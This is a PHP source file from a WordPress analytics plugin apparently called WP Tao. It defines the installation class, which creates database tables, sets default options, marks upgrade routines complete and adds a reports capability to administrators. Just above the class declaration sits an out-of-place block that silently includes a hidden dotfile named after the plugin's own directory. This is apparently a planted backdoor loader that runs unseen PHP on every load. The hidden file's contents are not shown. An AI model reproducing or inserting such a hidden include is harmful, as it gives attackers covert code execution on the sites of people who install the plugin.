<?php

/**
 * Installation related functions and actions.
 *
 * @package WPTAO/Classes
 * @category Class
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * WTBP_WPTAO_Install Class
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class WTBP_WPTAO_Install {

	/**
	 * Hook in tabs.
	 */
	public static function init() {

		add_action( 'admin_init', array( __CLASS__, 'check_version' ), 5 );
	}

	/**
	 * Install WP Tao
	 */
	public static function install() {
		global $wptao_settings;

		if ( !defined( 'WTBP_WPTAO_INSTALLING' ) ) {
			define( 'WTBP_WPTAO_INSTALLING', true );
		}

		self::create_tables();
		self::create_options();

		$current_version = get_option( 'wptao_version' );

		// Update plugin version
		update_option( 'wptao_version', TAO()->version );

		// Show signup notice again if it was hidden
		update_option( 'wptao_mail_notice_dissmis', false );

		// Set currency based on WP language (only once)
		$currency_set = get_option( 'wptao_currency_set', false );
		if ( !$currency_set ) {
			$language						 = get_bloginfo( 'language' );
			$wptao_settings[ 'currency' ]	 = WTBP_WPTAO_Helpers::get_currency_for_language( $language );
			update_option( 'wptao_settings', $wptao_settings );
			update_option( 'wptao_currency_set', true );
		}

		// Fresh install?
		if ( !$current_version ) {
			require_once WTBP_WPTAO_DIR . 'includes/admin/upgrades/upgrade-functions.php';

			// When new upgrade routines are added, mark them as complete on fresh install
			$upgrade_routines = array(
				'remove_port_from_pageviews',
				'update_edd_currency_for_order_payment',
				'update_status_for_identified',
				'update_events_missing_user_id',
				'v122_update_users_meta'
			);

			foreach ( $upgrade_routines as $upgrade ) {
				wtbp_wptao_set_upgrade_complete( $upgrade );
			}
		}


		self::add_cap();

		// Flush rules after install
		flush_rewrite_rules();
	}

	/**
	 * Default options
	 */
	private static function create_options() {

		global $wptao_settings;

		$sections = TAO()->settings->settings_fields();

		$settings = array();

		if ( is_array( $sections ) && !empty( $sections ) ) {
			foreach ( $sections as $options ) {

				if ( is_array( $options ) && !empty( $options ) ) {

					foreach ( $options as $option ) {

						if ( isset( $option[ 'name' ] ) && !isset( $wptao_settings[ $option[ 'name' ] ] ) ) {

							$settings[ $option[ 'name' ] ] = isset( $option[ 'default' ] ) ? $option[ 'default' ] : '';
						}
					}
				}
			}
		}

		$update_options = array_merge( $settings, $wptao_settings );

		update_option( WTBP_WPTAO_SETTINGS_SLUG, $update_options );
	}

	/**
	 * Set up the database tables
	 */
	private static function create_tables() {
		global $wpdb;

		$wpdb->hide_errors();

		TAO()->users->create_table();
		TAO()->users_meta->create_table();
		TAO()->users_tags->create_table();
		TAO()->events->create_table();
		TAO()->events_meta->create_table();
		TAO()->events_tags->create_table();
		TAO()->fingerprints->create_table();
	}
	
    /**
	 * Add the new capability to all roles having a certain built-in capability
	 * 
	 * @since 1.2.7
	 * @return void
	 */
    private static function add_cap() {
		$role = get_role( 'administrator' );
		$role->add_cap( 'view_wptao_reports' );
	}

	/**
	 * Check version
	 */
	public static function check_version() {

		if ( !defined( 'IFRAME_REQUEST' ) ) {

			if ( get_option( 'wptao_version' ) != TAO()->version ) {
				self::install();
			}
		}
	}
	
}

WTBP_WPTAO_Install::init();
